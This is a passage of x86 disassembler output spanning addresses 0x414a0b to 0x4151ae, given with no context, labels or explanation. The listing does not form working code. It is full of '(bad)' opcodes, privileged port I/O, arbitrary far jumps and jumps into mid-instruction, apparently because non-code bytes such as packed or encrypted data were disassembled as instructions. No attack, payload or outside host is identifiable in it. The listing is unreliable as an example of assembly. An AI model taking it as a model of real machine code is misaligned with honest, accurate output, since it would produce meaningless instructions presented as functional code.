  414a0b:	mov    dl,0x36
  414a0d:	mov    es,WORD PTR [esp+edi*2-0x5b7677a1]
  414a14:	jge    0x4149f2
  414a16:	sub    ch,al
  414a18:	fsubp  st(3),st
  414a1a:	sbb    al,0x2a
  414a1c:	pushf  
  414a1d:	dec    edx
  414a1e:	imul   esi,ebp,0xcbf1054a
  414a24:	xchg   edi,eax
  414a25:	dec    DWORD PTR [edi-0x3c]
  414a28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a29:	inc    edi
  414a2a:	pushf  
  414a2b:	dec    edi
  414a2c:	and    dl,al
  414a2e:	hlt    
  414a2f:	std    
  414a30:	mov    eax,0xa9182bb
  414a35:	repnz dec ebp
  414a37:	arpl   si,si
  414a39:	xlat   BYTE PTR ds:[ebx]
  414a3a:	sub    ebp,eax
  414a3c:	jecxz  0x414a78
  414a3e:	ja     0x4149f3
  414a40:	xchg   edx,eax
  414a41:	fstp   DWORD PTR [ebp-0x21b765e2]
  414a47:	nop
  414a48:	aad    0x37
  414a4a:	lods   eax,DWORD PTR ds:[esi]
  414a4b:	std    
  414a4c:	out    dx,al
  414a4d:	es jbe 0x414ab7
  414a50:	add    al,0x8c
  414a52:	add    ch,bl
  414a54:	repnz sbb al,0xea
  414a57:	push   ebp
  414a58:	lahf   
  414a59:	mov    esp,0x7fa949f3
  414a5e:	or     eax,0x7e63f142
  414a63:	std    
  414a64:	jl     0x414a64
  414a66:	loope  0x414aba
  414a68:	mov    ah,0x34
  414a6a:	dec    esi
  414a6b:	xchg   ebp,eax
  414a6c:	pop    eax
  414a6d:	mov    eax,edx
  414a6f:	sbb    al,0x3f
  414a71:	jne    0x414a26
  414a73:	cmp    ebx,ebx
  414a75:	(bad)  
  414a76:	jno    0x414ade
  414a78:	stos   BYTE PTR es:[edi],al
  414a79:	sub    BYTE PTR [edx],bh
  414a7b:	xlat   BYTE PTR ds:[ebx]
  414a7c:	push   eax
  414a7d:	and    DWORD PTR [edi+0x39],ebp
  414a80:	shl    DWORD PTR [ecx-0x5f],cl
  414a83:	jo     0x414a10
  414a85:	xor    eax,0xea93a84d
  414a8a:	scas   eax,DWORD PTR es:[edi]
  414a8b:	loope  0x414ade
  414a8d:	push   ecx
  414a8e:	sbb    BYTE PTR [edx+0x62e27ef2],dh
  414a94:	ror    BYTE PTR [edi+0x17],0x1e
  414a98:	je     0x414a94
  414a9a:	aas    
  414a9b:	call   0x8c5fcc0
  414aa0:	push   eax
  414aa1:	add    DWORD PTR [ecx+0x6b23ceca],0x44bc5052
  414aab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414aac:	outs   dx,BYTE PTR ds:[esi]
  414aad:	pop    ecx
  414aae:	xor    eax,0x3becc4d2
  414ab3:	and    al,0xa0
  414ab5:	dec    ebp
  414ab6:	jb     0x414ad4
  414ab8:	test   DWORD PTR [ecx],esp
  414aba:	or     DWORD PTR [edx-0x7f],edi
  414abd:	mov    WORD PTR [ecx-0x25],?
  414ac0:	enter  0xc564,0x17
  414ac4:	dec    ecx
  414ac5:	lods   al,BYTE PTR ds:[esi]
  414ac6:	jae    0x414af7
  414ac8:	mov    al,ds:0x55d42e7b
  414acd:	scas   al,BYTE PTR es:[edi]
  414ace:	xchg   ebx,eax
  414acf:	sbb    esi,edi
  414ad1:	jne    0x414ae9
  414ad3:	mov    bl,BYTE PTR [esi-0x4a2d4835]
  414ad9:	fcomp  DWORD PTR [edi+0x346dbdd2]
  414adf:	stos   DWORD PTR es:[edi],eax
  414ae0:	mov    eax,DWORD PTR [ebx]
  414ae2:	jae    0x414abf
  414ae4:	repz rol dh,0x23
  414ae8:	test   al,0xbc
  414aea:	loope  0x414a82
  414aec:	sahf   
  414aed:	dec    esi
  414aee:	sub    al,0x4d
  414af1:	and    DWORD PTR [eax-0x42],edi
  414af4:	fisttp WORD PTR [ecx-0x6a]
  414af7:	push   esi
  414af8:	repz ret 0xa2ea
  414afc:	pop    eax
  414afd:	aaa    
  414afe:	jp     0x414a8f
  414b00:	retf   0x4365
  414b03:	inc    ebp
  414b04:	iret   
  414b05:	int    0xa8
  414b07:	xor    edi,DWORD PTR [ebx+0x27]
  414b0a:	mov    dl,0x3b
  414b0c:	aam    0x56
  414b0e:	mov    edx,0x1e1b31c2
  414b13:	inc    ecx
  414b14:	imul   ebp,DWORD PTR [eax-0x236222a4],0x42
  414b1b:	int    0x64
  414b1d:	jo     0x414b81
  414b1f:	jb     0x414b6e
  414b21:	sti    
  414b22:	mov    cl,BYTE PTR [edx-0x46]
  414b25:	mov    bl,0x81
  414b27:	adc    BYTE PTR [esi+ecx*4+0x41d4339d],0x5f
  414b2f:	cmp    BYTE PTR [ebx+ecx*1-0x6f],0x96
  414b34:	sbb    esp,esi
  414b36:	in     al,0x46
  414b38:	mov    dl,0x1c
  414b3a:	push   edi
  414b3b:	outs   dx,BYTE PTR ds:[esi]
  414b3c:	imul   ecx,esi,0xfea4222d
  414b42:	adc    al,0x24
  414b44:	pop    esi
  414b45:	ret    0xf34b
  414b48:	cmp    ah,bh
  414b4a:	in     eax,0xd1
  414b4c:	scas   eax,DWORD PTR es:[edi]
  414b4d:	(bad)  
  414b4e:	in     al,dx
  414b4f:	sbb    BYTE PTR [ebx+eax*2-0x57],al
  414b53:	jge    0x414bbb
  414b55:	(bad)  
  414b56:	out    0xb,eax
  414b58:	pop    eax
  414b59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b5a:	into   
  414b5b:	cli    
  414b5c:	mov    ds:0x4a1fd9a5,al
  414b61:	mov    ecx,0x6f50ed8e
  414b66:	pop    ss
  414b67:	mov    dh,BYTE PTR [ebp+0x31]
  414b6a:	mov    dh,0xa1
  414b6c:	js     0x414b72
  414b6e:	inc    ebp
  414b6f:	xor    eax,0x67ab6703
  414b74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b75:	popf   
  414b76:	jae    0x414b71
  414b78:	pushf  
  414b79:	jg     0x414bc5
  414b7b:	jbe    0x414b9f
  414b7d:	std    
  414b7e:	shl    DWORD PTR [ebp+0x2e],1
  414b81:	popf   
  414b82:	outs   dx,DWORD PTR ds:[esi]
  414b83:	repz popf 
  414b85:	and    al,0xf0
  414b87:	(bad)  
  414b88:	pop    edx
  414b89:	clc    
  414b8a:	daa    
  414b8b:	fmulp  st(6),st
  414b8d:	je     0x414b13
  414b8f:	add    ah,ah
  414b91:	push   DWORD PTR [eax+0x5a9c748c]
  414b97:	jns    0x414b52
  414b99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b9a:	(bad)  
  414b9b:	loop   0x414b7e
  414b9d:	fs cwde 
  414b9f:	sub    eax,0xd0c27814
  414ba4:	pop    ss
  414ba5:	daa    
  414ba6:	pop    ds
  414ba7:	adc    al,BYTE PTR [esi+eiz*1]
  414baa:	dec    edi
  414bab:	bound  ebx,QWORD PTR [ebp-0x30]
  414bae:	fnsave [edx+0x25918965]
  414bb4:	sub    DWORD PTR [edx-0x64a47dd3],esp
  414bba:	push   ecx
  414bbb:	pop    edi
  414bbc:	dec    eax
  414bbd:	inc    edx
  414bbe:	shl    DWORD PTR [eax-0x5c],cl
  414bc1:	jns    0x414c1b
  414bc3:	pop    ebx
  414bc4:	retf   0x6c6
  414bc7:	iret   
  414bc8:	mov    ebx,DWORD PTR [ebx]
  414bca:	icebp  
  414bcb:	jns    0x414bb0
  414bcd:	pop    esp
  414bce:	mov    DWORD PTR [esi+0x2],esp
  414bd1:	add    DWORD PTR [edi-0x1b],0x93a5fd33
  414bd8:	inc    esi
  414bd9:	cld    
  414bda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414bdb:	sub    dh,BYTE PTR [edi-0x7dcf3fc1]
  414be1:	mov    dl,0x17
  414be3:	lods   eax,DWORD PTR ds:[esi]
  414be4:	test   DWORD PTR [edi+0x478e5c60],esi
  414bea:	xor    al,0x49
  414bec:	jae    0x414b99
  414bee:	mov    bl,0xd7
  414bf0:	or     bh,al
  414bf2:	inc    edx
  414bf3:	inc    eax
  414bf4:	mov    esi,0xe3429720
  414bf9:	out    dx,al
  414bfa:	pusha  
  414bfb:	arpl   ax,si
  414bfd:	cmc    
  414bfe:	rcl    esi,cl
  414c00:	popf   
  414c01:	adc    ecx,ebx
  414c03:	cwde   
  414c04:	push   cs
  414c05:	jmp    0xd7a9:0x8ba0af51
  414c0c:	iret   
  414c0d:	dec    edi
  414c0e:	xchg   ebp,eax
  414c0f:	fld1   
  414c11:	xchg   esp,eax
  414c12:	fldenv [ebx+0x656cb998]
  414c18:	sahf   
  414c19:	out    dx,eax
  414c1a:	mov    al,ds:0xeab12101
  414c1f:	sub    edx,ecx
  414c21:	mov    ds:0xe3c8a618,al
  414c26:	(bad)  
  414c27:	jmp    0xae79:0x3f58963c
  414c2e:	and    eax,0x3e10e881
  414c33:	mov    DWORD PTR [esi+0x15],eax
  414c36:	xor    bh,BYTE PTR [esi]
  414c38:	test   eax,0x69e062c9
  414c3d:	sahf   
  414c3e:	jl     0x414bdc
  414c40:	retf   0x6888
  414c43:	loopne 0x414c78
  414c45:	jnp    0x414c77
  414c47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c48:	xlat   BYTE PTR ds:[ebx]
  414c49:	jmp    0x414c86
  414c4b:	mov    bh,0xfd
  414c4d:	or     al,0x61
  414c4f:	rol    DWORD PTR [ecx],0xdf
  414c52:	xchg   ebx,eax
  414c53:	jo     0x414c27
  414c55:	sbb    al,0x7b
  414c57:	es inc ecx
  414c59:	fld    QWORD PTR [edx-0x7a1f813b]
  414c5f:	xchg   esp,eax
  414c60:	xor    bl,0xf6
  414c63:	sub    BYTE PTR [eax],bl
  414c65:	cs fwait
  414c67:	(bad)  
  414c68:	sahf   
  414c69:	loopne 0x414c97
  414c6b:	dec    edi
  414c6c:	es mov bh,0xa2
  414c6f:	js     0x414c64
  414c71:	mov    gs,WORD PTR [edi+0x2b]
  414c74:	adc    eax,0xbfa7c69f
  414c79:	push   ds
  414c7a:	adc    BYTE PTR [ebx+0x20b08db5],0x75
  414c81:	jbe    0x414ce0
  414c83:	adc    al,0x3
  414c85:	stc    
  414c86:	arpl   cx,di
  414c88:	ret    
  414c89:	lea    edi,[ebx-0x5b]
  414c8c:	js     0x414c81
  414c8e:	fstp   QWORD PTR [edx]
  414c90:	xchg   DWORD PTR [eax-0x17d6a2a7],edi
  414c96:	pop    esp
  414c97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c98:	pandn  mm4,QWORD PTR [edi]
  414c9b:	ss jl  0x414d12
  414c9e:	dec    eax
  414c9f:	sub    edx,esi
  414ca1:	mov    esi,0x74e236a1
  414ca6:	jl     0x414d08
  414ca8:	test   eax,0x7ec95cab
  414cad:	aad    0x10
  414caf:	dec    ebp
  414cb0:	xor    ecx,ebx
  414cb2:	push   0x33849a71
  414cb7:	fst    QWORD PTR [ecx-0x7d7c2b00]
  414cbd:	int3   
  414cbe:	mov    ds:0x624af2d6,eax
  414cc3:	lods   al,BYTE PTR ds:[esi]
  414cc4:	pop    esi
  414cc5:	cmp    edi,DWORD PTR ds:0x4ee34e79
  414ccb:	cld    
  414ccc:	jb     0x414ccf
  414cce:	cmp    ah,dl
  414cd0:	repz retf 
  414cd2:	cli    
  414cd3:	push   esp
  414cd4:	pusha  
  414cd5:	sub    dl,BYTE PTR [ecx-0xd]
  414cd8:	mov    esp,ebx
  414cda:	mov    fs,eax
  414cdc:	sub    al,dh
  414cde:	sub    eax,0xa7793fce
  414ce3:	lods   al,BYTE PTR ds:[esi]
  414ce4:	inc    esi
  414ce5:	push   cs
  414ce6:	aad    0xc1
  414ce8:	clc    
  414ce9:	call   0xf45b:0x89e437e0
  414cf0:	xor    BYTE PTR [ebp-0x6c68b838],al
  414cf6:	std    
  414cf7:	mov    ds:0xbdf3b3a4,al
  414cfc:	xchg   ebp,eax
  414cfd:	(bad)  
  414cfe:	rol    BYTE PTR ds:0x5b29fa97,1
  414d04:	mov    edi,0xd2294c05
  414d09:	out    0xbd,al
  414d0b:	add    eax,0xe0613e27
  414d10:	(bad)  
  414d12:	xchg   BYTE PTR [eax],cl
  414d14:	mov    ecx,ebp
  414d16:	add    eax,DWORD PTR [edi+0x61]
  414d19:	mov    bl,0x9f
  414d1b:	jb     0x414cc2
  414d1d:	bound  ebx,QWORD PTR [ebx+0x1a]
  414d20:	jae    0x414d21
  414d22:	inc    edi
  414d23:	retf   
  414d24:	sub    edx,DWORD PTR [ebx]
  414d26:	adc    eax,0x24e5c91a
  414d2b:	jo     0x414d32
  414d2d:	xchg   esp,eax
  414d2e:	out    dx,al
  414d2f:	js     0x414d14
  414d31:	dec    eax
  414d32:	mov    edx,0x29e5d91a
  414d37:	inc    esi
  414d38:	pop    edi
  414d39:	enter  0x8e61,0x4
  414d3d:	pop    ecx
  414d3e:	adc    eax,0xa1c5e40f
  414d43:	sub    DWORD PTR [ebx+esi*4-0x2d22e9cc],ebx
  414d4a:	inc    edx
  414d4b:	sbb    al,0xc0
  414d4d:	not    bl
  414d4f:	scas   al,BYTE PTR es:[edi]
  414d50:	inc    esp
  414d51:	pop    edx
  414d52:	xchg   ebx,eax
  414d53:	inc    ebp
  414d54:	pushf  
  414d55:	or     eax,0x90726ba0
  414d5a:	popf   
  414d5b:	xor    eax,0x1cde550f
  414d60:	addr16 dec esp
  414d62:	jmp    0x414d2f
  414d64:	dec    ebp
  414d65:	mov    bl,0xa3
  414d67:	adc    DWORD PTR [esi],ebp
  414d69:	rcr    BYTE PTR [esp+ebp*1+0x24],0xcb
  414d6e:	dec    ebx
  414d6f:	fwait
  414d70:	adc    al,0x29
  414d72:	adc    edi,DWORD PTR [ecx]
  414d74:	jecxz  0x414daf
  414d76:	pop    esi
  414d77:	iret   
  414d78:	xchg   esi,eax
  414d79:	loop   0x414df8
  414d7b:	pop    ebp
  414d7c:	idiv   DWORD PTR [eax-0x5]
  414d7f:	fld    DWORD PTR [ecx-0x29]
  414d82:	jno    0x414ddb
  414d84:	pusha  
  414d85:	sbb    DWORD PTR [esi+0x73f3b998],eax
  414d8b:	sub    al,0x8b
  414d8d:	fist   WORD PTR [ecx+0x5c]
  414d90:	or     dl,al
  414d92:	fsub   DWORD PTR [eax+eiz*1-0x575752d8]
  414d99:	mov    ecx,0x665b9d1b
  414d9e:	inc    eax
  414d9f:	cld    
  414da0:	stc    
  414da1:	push   ebx
  414da2:	daa    
  414da3:	mov    ch,0xca
  414da5:	jnp    0x414d83
  414da7:	or     ecx,DWORD PTR ds:0x6276350f
  414dad:	push   ebx
  414dae:	repz pop es
  414db0:	jp     0x414dca
  414db2:	(bad)  
  414db3:	push   eax
  414db4:	lock arpl WORD PTR [edx+0x35],si
  414db8:	mov    eax,ds:0x2a1bf51b
  414dbd:	mov    ebp,DWORD PTR [ebx]
  414dbf:	fnsave [edx-0x1cb2401c]
  414dc5:	in     al,dx
  414dc6:	mov    dl,0x99
  414dc8:	jmp    0x414d54
  414dca:	mov    cl,0x6f
  414dcc:	pop    es
  414dcd:	or     ch,BYTE PTR ds:0xafbd9e6c
  414dd3:	sub    cl,bl
  414dd5:	inc    edx
  414dd6:	rcl    al,1
  414dd8:	sub    dh,BYTE PTR [edi+0x2e]
  414ddb:	jae    0x414e06
  414ddd:	shl    BYTE PTR [ebx+ebx*8+0x6c],0xd6
  414de2:	int3   
  414de3:	jmp    0x65e4:0x43d212f2
  414dea:	(bad)  
  414deb:	cmp    BYTE PTR cs:[ebx-0x37],bl
  414def:	jg     0x414dc8
  414df1:	mov    edi,ss
  414df3:	shl    BYTE PTR [edx+0x76432089],1
  414df9:	jnp    0x414e6f
  414dfb:	mov    al,ds:0xd56ca1f1
  414e00:	jecxz  0x414dc2
  414e02:	push   ecx
  414e03:	mov    edx,0x8db6b9f2
  414e08:	or     DWORD PTR [ebp+edi*2+0x11],edx
  414e0c:	add    ecx,esi
  414e0e:	mov    al,ds:0x8c19da74
  414e13:	mov    al,ds:0x65a759fd
  414e18:	stc    
  414e19:	ins    BYTE PTR es:[edi],dx
  414e1a:	(bad)  
  414e1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e1c:	jp     0x414dd9
  414e1e:	xor    eax,0x40613458
  414e23:	adc    ebx,DWORD PTR [ebx+0x2c]
  414e26:	xchg   edi,eax
  414e27:	mov    ds,WORD PTR [edi+esi*2+0x49b7b740]
  414e2e:	mov    ebx,0xb12c282
  414e33:	mov    al,ds:0x41f2be7f
  414e38:	ins    BYTE PTR es:[edi],dx
  414e39:	mov    bl,cl
  414e3b:	cli    
  414e3c:	sub    DWORD PTR [ecx+0x33],eax
  414e3f:	in     eax,dx
  414e40:	jnp    0x414dfd
  414e42:	add    esi,DWORD PTR [edx-0x6ee5b058]
  414e48:	push   edx
  414e49:	cwde   
  414e4a:	mov    ecx,0xca5dd14e
  414e4f:	into   
  414e50:	inc    esi
  414e51:	repnz retf 
  414e53:	imul   ecx,DWORD PTR [edi],0x2a
  414e56:	mov    ds:0xc6dda970,eax
  414e5b:	repz and dh,dh
  414e5e:	xchg   edx,eax
  414e5f:	mov    ebx,0xcb21e7d8
  414e64:	mov    al,0x5c
  414e66:	ins    BYTE PTR es:[edi],dx
  414e67:	cmp    ch,BYTE PTR [eax+eiz*2+0x1a]
  414e6b:	sub    edx,DWORD PTR [edi]
  414e6d:	out    dx,al
  414e6e:	and    esp,DWORD PTR [edi-0x62]
  414e71:	imul   ebx,DWORD PTR [edx],0xffffffd9
  414e74:	jmp    0x2174:0x1b6e12aa
  414e7b:	(bad)  
  414e7c:	mov    esp,0x3bd1f7c2
  414e81:	jno    0x414e92
  414e83:	jo     0x414ea5
  414e85:	jl     0x414efa
  414e87:	jp     0x414e6a
  414e89:	and    al,0xd3
  414e8b:	lahf   
  414e8c:	sahf   
  414e8d:	xchg   esp,eax
  414e8e:	cmp    ebx,ebx
  414e90:	ins    DWORD PTR es:[edi],dx
  414e91:	and    al,0x2c
  414e93:	mov    bl,0x7b
  414e95:	mov    ah,0x3e
  414e97:	loopne 0x414ed5
  414e99:	(bad)  
  414e9a:	and    eax,0x1d338ffb
  414e9f:	xor    DWORD PTR [edi-0x6d],0x23
  414ea3:	mov    eax,DWORD PTR [esi]
  414ea5:	mov    ch,0x27
  414ea7:	jb     0x414ebd
  414ea9:	cmp    BYTE PTR [ebx],0xea
  414eac:	dec    edi
  414ead:	inc    eax
  414eae:	or     esi,ebp
  414eb0:	adc    al,0x6e
  414eb2:	jge    0x414f1f
  414eb4:	pushf  
  414eb5:	lock mov dl,dl
  414eb8:	dec    ecx
  414eb9:	sti    
  414eba:	pop    ds
  414ebb:	ret    
  414ebc:	retf   
  414ebd:	hlt    
  414ebe:	jnp    0x414e8a
  414ec0:	dec    edx
  414ec1:	push   cs
  414ec2:	lods   al,BYTE PTR ds:[esi]
  414ec3:	sub    al,0xd6
  414ec5:	mov    al,0x11
  414ec7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ec8:	mov    eax,ds:0x8f269605
  414ecd:	inc    esp
  414ece:	sub    ebx,DWORD PTR [ecx-0x1b]
  414ed1:	add    edx,DWORD PTR [edi-0x6]
  414ed4:	push   ds
  414ed5:	inc    esp
  414ed6:	add    al,0x92
  414ed8:	push   cs
  414ed9:	cmp    ah,BYTE PTR [ecx-0x420b0bf5]
  414edf:	and    DWORD PTR gs:[ecx-0x5c],0xffffff8c
  414ee4:	jnp    0x414ecb
  414ee6:	mov    eax,ds:0x7e623f27
  414eeb:	fucomi st,st(4)
  414eed:	out    0x6e,eax
  414eef:	(bad)  
  414ef0:	std    
  414ef1:	and    BYTE PTR [edx],bh
  414ef3:	mov    edi,0x91ed9738
  414ef8:	pop    esi
  414ef9:	je     0x414f25
  414efb:	add    al,0x73
  414efd:	outs   dx,BYTE PTR ds:[esi]
  414efe:	outs   dx,BYTE PTR ds:[esi]
  414eff:	cs push ds
  414f01:	and    esp,DWORD PTR [ebp+esi*8-0x4e]
  414f05:	jl     0x414f17
  414f07:	into   
  414f08:	sub    eax,0x890fdbbf
  414f0d:	jge    0x414eac
  414f0f:	jbe    0x414ee7
  414f11:	sub    cl,dh
  414f13:	pop    ds
  414f14:	lods   eax,DWORD PTR ds:[esi]
  414f15:	and    dh,bl
  414f17:	mov    al,ds:0xcf56c07
  414f1c:	pop    esp
  414f1d:	fld    DWORD PTR [esi]
  414f1f:	mov    al,ds:0x1111e39d
  414f24:	push   ebx
  414f25:	cmp    al,0xaa
  414f27:	cmp    eax,0x1015f804
  414f2c:	mov    ebx,DWORD PTR [ecx]
  414f2e:	mov    bl,0xb7
  414f30:	xchg   edx,eax
  414f31:	pop    ebp
  414f32:	adc    eax,0xb35d5c02
  414f37:	push   edx
  414f38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f39:	inc    edi
  414f3a:	cld    
  414f3b:	mov    ebp,0xfc483476
  414f40:	arpl   WORD PTR [esi-0x10a44141],cx
  414f46:	out    0x9d,al
  414f48:	lds    ebx,FWORD PTR [edi-0x4a]
  414f4b:	xchg   BYTE PTR ds:0x774172bc,bl
  414f51:	retf   0xa8a8
  414f54:	fst    QWORD PTR fs:[ecx+eiz*8-0x62]
  414f59:	inc    esi
  414f5a:	addr16 fcomi st,st(1)
  414f5d:	mov    edx,0xc767e513
  414f62:	adc    esi,edi
  414f64:	lods   eax,DWORD PTR ds:[esi]
  414f65:	jecxz  0x414f9d
  414f67:	dec    DWORD PTR [edx]
  414f69:	pop    esi
  414f6a:	jns    0x414faf
  414f6c:	xor    ch,dh
  414f6e:	js     0x414fe9
  414f70:	(bad)
  414f74:	ins    BYTE PTR es:[edi],dx
  414f75:	retf   0x6fb1
  414f78:	xchg   edx,eax
  414f79:	add    DWORD PTR [edi+0x37],0xa47bf428
  414f80:	shl    DWORD PTR [eax],1
  414f82:	mov    dl,BYTE PTR [esi+0x30]
  414f85:	lahf   
  414f86:	mov    eax,ds:0x41857b5b
  414f8b:	(bad)  
  414f8c:	aam    0xe9
  414f8e:	mov    cl,0xe
  414f90:	lahf   
  414f91:	xor    BYTE PTR [edx],al
  414f93:	imul   edi,edi,0x3b
  414f96:	js     0x414fbd
  414f98:	fisubr WORD PTR [edx+0x13f863d6]
  414f9e:	xlat   BYTE PTR es:[ebx]
  414fa0:	bound  esp,QWORD PTR [edi-0x2ad5bcf7]
  414fa6:	fst    QWORD PTR [esi+0x22d64516]
  414fac:	xchg   BYTE PTR [ebp+0x30],dh
  414faf:	out    0x3a,al
  414fb1:	out    0x1e,al
  414fb3:	add    BYTE PTR [ecx-0x12],0xf8
  414fb7:	sbb    DWORD PTR [ebx+0x2e],eax
  414fba:	scas   al,BYTE PTR es:[edi]
  414fbb:	add    al,0x6a
  414fbd:	and    al,0xd3
  414fbf:	xor    bh,BYTE PTR [ebx+0x1380e4f2]
  414fc5:	data16 mov ch,0xfd
  414fc8:	adc    DWORD PTR [edi+0x63f32141],0xffffffb4
  414fcf:	jmp    0x3c69:0x4347105d
  414fd6:	lahf   
  414fd7:	inc    edx
  414fd8:	popf   
  414fd9:	aaa    
  414fda:	mov    al,0x24
  414fdc:	leave  
  414fdd:	mov    bl,0xb2
  414fdf:	not    ah
  414fe1:	push   edx
  414fe2:	xor    edx,esp
  414fe4:	and    edx,DWORD PTR [ecx-0x127a7161]
  414fea:	nop
  414feb:	call   0xfed:0xf8f8dc6e
  414ff2:	push   cs
  414ff3:	push   edi
  414ff4:	pusha  
  414ff5:	xor    al,0x51
  414ff7:	jne    0x41500c
  414ff9:	and    BYTE PTR [esi+0xe342692],al
  414fff:	sub    eax,0x5caab171
  415004:	xor    ch,bl
  415006:	cmc    
  415007:	ss dec eax
  415009:	xchg   ecx,eax
  41500a:	xor    al,0xab
  41500c:	ja     0x414faf
  41500e:	xor    cl,BYTE PTR [ebx]
  415010:	scas   al,BYTE PTR es:[edi]
  415011:	jns    0x415000
  415013:	xor    eax,0x87c72f35
  415018:	add    al,0xb0
  41501a:	sub    eax,0xb686e53e
  41501f:	pop    eax
  415020:	xor    cl,BYTE PTR [ebp+0x2a]
  415023:	(bad)
  415026:	or     BYTE PTR [esi+0x2b],0xb2
  41502a:	cmc    
  41502b:	arpl   WORD PTR [ebx+0x77abeea7],sp
  415031:	sar    DWORD PTR ds:0xb243c354,0x28
  415038:	and    bh,BYTE PTR [edi]
  41503a:	lock dec eax
  41503c:	or     eax,0x56ac251
  415041:	mov    dh,0x5d
  415043:	ins    DWORD PTR es:[edi],dx
  415044:	inc    esi
  415045:	stos   BYTE PTR es:[edi],al
  415046:	and    ecx,0xe518e32b
  41504c:	das    
  41504d:	mov    al,ds:0x2b0cd209
  415052:	dec    ebx
  415053:	div    BYTE PTR [edx+0x27]
  415056:	and    ah,BYTE PTR [eax-0x38]
  415059:	xor    DWORD PTR [esi],ebp
  41505b:	adc    BYTE PTR [ebx],cl
  41505d:	cwde   
  41505e:	xchg   edi,eax
  41505f:	loop   0x4150ba
  415061:	into   
  415062:	mov    ds:0x80f25eab,al
  415067:	std    
  415068:	cmp    bh,cl
  41506a:	and    edi,ecx
  41506c:	pop    ds
  41506d:	shl    bh,1
  41506f:	mov    WORD PTR [ecx-0x69],?
  415072:	jmp    0xcce81eb5
  415077:	mov    al,BYTE PTR [esp+eiz*8+0x58e8d55f]
  41507e:	add    BYTE PTR [ebx+0x52],dh
  415081:	test   esi,edx
  415083:	addr16 mov edx,esp
  415086:	fucom  st(0)
  415088:	mov    al,es:0x4ce19ff3
  41508e:	ret    0x551b
  415091:	test   DWORD PTR [ebp+0x792a951f],esi
  415097:	add    DWORD PTR [edx],0x28
  41509a:	jge    0x4150ac
  41509c:	das    
  41509d:	sbb    BYTE PTR [edi],bl
  41509f:	dec    ecx
  4150a0:	lods   al,BYTE PTR ds:[esi]
  4150a1:	xor    DWORD PTR [eax+0x154edd0],0xffffff84
  4150a8:	xor    al,0x84
  4150aa:	fstp   TBYTE PTR [ebx+0x6f]
  4150ad:	xchg   ebx,eax
  4150ae:	sbb    al,0x80
  4150b0:	test   al,0xf4
  4150b2:	xor    bh,BYTE PTR [ecx-0x75]
  4150b5:	mov    ch,0xda
  4150b7:	sti    
  4150b8:	dec    esi
  4150b9:	cli    
  4150ba:	dec    ebx
  4150bb:	in     eax,0x7
  4150bd:	jge    0x415107
  4150bf:	cwde   
  4150c0:	push   edi
  4150c1:	fcomp  QWORD PTR [ecx]
  4150c3:	cmp    DWORD PTR [ebp+edx*2-0x5f],edx
  4150c7:	out    0xc9,al
  4150c9:	adc    BYTE PTR [ebp-0x5552579a],dl
  4150cf:	js     0x41506a
  4150d1:	mov    ebx,0xa4cd6ca6
  4150d6:	int    0xba
  4150d8:	sbb    eax,DWORD PTR [esi+0x2f75ad0d]
  4150de:	pop    esp
  4150df:	(bad)  
  4150e0:	fmul   QWORD PTR [eax-0x70e8fede]
  4150e6:	add    BYTE PTR [esi-0x3a10c64b],cl
  4150ec:	add    eax,0xd654d08a
  4150f1:	cli    
  4150f2:	loopne 0x4150aa
  4150f4:	pop    eax
  4150f5:	rcr    DWORD PTR [bx-0x3f91],1
  4150fa:	inc    eax
  4150fb:	imul   ebx,DWORD PTR [esi+esi*4-0x2f],0x78fc70c4
  415103:	mov    BYTE PTR [edx],bh
  415105:	and    DWORD PTR [esi-0x5f5abc4d],0x18191709
  41510f:	stos   DWORD PTR es:[edi],eax
  415110:	daa    
  415111:	fnstsw WORD PTR [edi+ecx*4+0x1c]
  415115:	sbb    ebp,DWORD PTR [esi+0x52a48d3c]
  41511b:	inc    esp
  41511c:	sbb    eax,0x4bd157ed
  415121:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415122:	cmp    al,BYTE PTR [edi]
  415124:	cli    
  415125:	push   esi
  415126:	and    bh,al
  415128:	add    al,0x26
  41512a:	std    
  41512b:	retf   0x8063
  41512e:	push   DWORD PTR [edi]
  415130:	cmp    al,0x2e
  415132:	inc    ecx
  415133:	outs   dx,DWORD PTR ds:[esi]
  415134:	das    
  415135:	fld    QWORD PTR [esi]
  415137:	pusha  
  415138:	cmp    ecx,DWORD PTR cs:[ebx]
  41513b:	mov    eax,0x2d586be7
  415140:	inc    eax
  415141:	adc    ebx,DWORD PTR [ebp+0x43]
  415144:	fwait
  415145:	mov    esp,0xb7d05bd4
  41514a:	mov    cl,BYTE PTR [esi+0xe]
  41514d:	push   esp
  41514e:	ret    
  41514f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415150:	and    bl,dl
  415152:	ins    DWORD PTR es:[edi],dx
  415153:	mov    ds:0x7100d811,al
  415158:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415159:	shl    ecx,1
  41515b:	xor    al,0x87
  41515d:	xor    DWORD PTR [ecx+edx*1-0x1b],0x8066daf9
  415165:	jle    0x4151e6
  415167:	pop    esp
  415168:	adc    DWORD PTR [ebx+0x6bcf551f],edi
  41516e:	cmp    al,0x92
  415170:	cmc    
  415171:	mov    ebx,0x7d649190
  415176:	call   0x386d:0x12b575d5
  41517d:	inc    esp
  41517e:	int    0x32
  415180:	sbb    dl,BYTE PTR [ebx+eiz*8+0xb460c7b]
  415187:	dec    esp
  415188:	mov    ds:0x82291469,eax
  41518d:	int3   
  41518e:	and    BYTE PTR [ebx],bl
  415190:	add    ebx,ebp
  415192:	les    ebp,FWORD PTR [esi+ebp*4+0x4d]
  415196:	and    ch,bl
  415198:	and    eax,0x567b72fa
  41519d:	fiadd  WORD PTR [ebx+0x13]
  4151a0:	or     DWORD PTR [esi-0x60e0a4db],edx
  4151a6:	pushf  
  4151a7:	xchg   BYTE PTR [edi+ebp*4+0x35f79d90],ch
  4151ae:	jl     0x41517c
